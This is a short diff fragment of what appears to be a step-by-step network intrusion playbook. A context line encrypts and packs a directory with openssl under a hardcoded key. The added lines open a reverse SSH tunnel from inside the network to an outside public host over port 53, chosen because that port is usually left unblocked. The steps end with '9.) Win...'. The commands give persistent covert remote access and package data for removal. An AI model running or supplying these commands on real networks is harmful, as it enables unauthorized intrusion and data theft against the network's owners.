@@ -39,5 +39,7 @@ tar -P -zcf - $dirname | openssl aes-128-cbc -out $dirname.tar.gz -k 1234
 
 
 8.) Opens reverse ssh into network. 
+ssh -R 53:localhost:22 sourceuser@<public ip>
+tunnel through port 53 (because it it is normally unblocked)
 
 9.) Win...
